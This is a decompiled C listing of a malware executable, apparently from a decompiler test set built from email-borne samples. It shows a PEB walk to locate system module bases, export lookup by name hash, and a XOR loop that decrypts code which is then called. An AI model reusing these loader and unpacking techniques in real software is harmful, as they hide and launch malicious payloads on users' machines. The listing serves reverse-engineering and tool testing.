// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0730/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401040(word32 ebp, selector fs)
{
	word32 edi_12;
	word32 edx_13 = fn00401150(fs, out edi_12);
	Mem17[fp + 0xFFFFA29F + edx_13:word32] = edx_13;
	word32 eax_24 = 0x032A1840 - (edx_13 << 0x0000000B) & 0x02E90800 - (edx_13 << 0x0000000B);
	word32 edx_33 = fp + 0xFFFFA2AB + dwLoc20;
	Mem34[edx_33 + 0x00000000:word32] = (eax_24 + 0xFF459E4C)[edx_13 * 0x00000200] - 0x00000028;
	word32 eax_38 = eax_24 + Mem34[((eax_24 + 0xFF459E4C) + (edx_13 << 0x00000009)) - 0x00000004:word32] + 0x00005D69 - dwLoc20;
	word32 esi_42;
	word32 ecx_43 = fn00401250(dwLoc20, out esi_42);
	Mem46[fp - 0x0000005C:word32] = fp - 0x00000008;
	Mem48[fp - 0x00000060:word32] = 0x00000004;
	Mem50[fp - 0x00000064:word32] = ecx_43;
	Mem52[fp - 0x00000068:word32] = esi_42;
	word32 ecx_56 = Mem52[fp + 0xFFFFA29F + dwLoc20:word32];
	fn004011A0(ecx_56, edi_12, ebp);
	Mem58[fp - 0x0000006C:word32] = dwLoc20;
	Mem64[fp - 0x00000070:word32] = dwLoc14;
	Mem66[fp - 0x00000074:word32] = eax_38;
	(dwLoc20 + 0x003FB3AF)();
	Mem81[fp - 0x00000078:word32] = 0x00000000;
	word32 v13_78 = eax_38 + 0x00005D71 - dwLoc20;
	Mem86[fp - 0x0000007C:word32] = v13_78 + 0x00000BCA;
	v13_78();
	int3();
	int3();
	Mem88[fp - 0x00000080:word32] = fp - 0x00000004;
	word32 edx_92 = Mem88[fp - 0x00000070:word32];
	word32 ecx_111 = Mem88[fp + 0xFFFFA24B + edx_92:word32];
	word32 ebx_113 = (fp + 0xFFFE8A84)[edx_92 * 0x00000004];
	Mem99[fp - 0x0000008C:word32] = 0x1D5E0989;
	word32 eax_102 = Mem99[fp - 0x0000008C:word32] - (edx_92 << 0x00000002);
	Mem104[fp - 0x0000008C:word32] = 0x0F278618;
	Mem105[fp - 0x00000084:word32] = 0x00000001;
	Mem106[fp - 0x00000088:word32] = Mem105[fp - 0x0000008C:word32];
	Mem109[fp - 0x00000088:word32] = Mem106[fp - 0x00000088:word32] + (edx_92 << 0x00000002);
	Mem116[ebx_113 + 0x00000000:word32] = Mem109[ebx_113 + 0x00000000:word32] ^ eax_102;
	ecx_111 = ecx_111 - 0x00000004;
	while (ecx_111 > 0x00000000)
	{
		eax_102 = eax_102 + Mem116[fp - 0x00000088:word32] + Mem116[fp - 0x00000084:word32];
		ebx_113 = ebx_113 + 0x00005D45 - Mem116[fp - 0x00000070:word32];
		Mem126[fp - 0x00000084:word32] = -Mem116[fp - 0x00000084:word32];
		Mem116[ebx_113 + 0x00000000:word32] = Mem109[ebx_113 + 0x00000000:word32] ^ eax_102;
		ecx_111 = ecx_111 - 0x00000004;
	}
	return;
}

word32 fn00401150(selector fs, ptr32 ediOut)
{
	word32 edx_8 = Mem0[fs:0x00000018:word32];
	word32 eax_16 = Mem0[0x00401014:word32] + 0xFFFFFFFF;
	if (Mem0[eax_16 + 0x00000000:byte] != 0x90)
		;
	eax_16();
	word32 edx_25 = Mem0[edx_8 + 0x00000BF4:word32];
	word32 edi_28;
	*ediOut = edx_8 - (edx_25 - 0xBFFFA2C7);
	return edx_25 - 0xBFFFA2C7;
}

void fn004011A0(word32 ecx, word32 edi, word32 dwArg00)
{
	word32 eax_4 = fn004011B0(ecx, edi);
	fn004011D0(eax_4, ecx);
	eax_4();
	return;
}

word32 fn004011B0(word32 ecx, word32 edi)
{
	return Mem0[Mem0[Mem0[Mem0[Mem0[edi + 0x00000030 + ecx:word32] + 0x0000000C:word32] + 0x0000001C:word32]:word32] + 0x00000008:word32];
}

void fn004011D0(word32 eax, word32 ecx)
{
	word32 esi_24 = Mem0[Mem0[Mem0[eax + ((ecx << 0x00000001) + 0xFFFFA2FB) - ecx:word32] + eax + 0x00000078:word32] + eax + 0x00000020:word32] + eax;
	Mem32[fp + 0x00005D39 - ecx:word32] = 0x5600D1A4 - ecx;
	word32 dwLoc0C_36 = 0x00000000;
	while (dwLoc08 != Mem32[((Mem32[esi_24 + dwLoc0C_36:word32] + eax) + 0xFFFFA2CB) + ecx:word32])
		dwLoc0C_36 = dwLoc0C_36 + 0x00000004;
	return;
}

word32 fn00401250(word32 ecx, ptr32 esiOut)
{
	word32 eax_13 = (ecx << 0x0000000A) + 0xFECB0E50 & (ecx << 0x00000009) + 0xFF447E00;
	word32 eax_17 = eax_13 + 0x0175043C - (ecx << 0x0000000A);
	word32 esi_14;
	*esiOut = eax_13;
	return Mem0[eax_17 + (Mem0[eax_17 + 0x00000000:word32] + 0x00000014):word32];
}

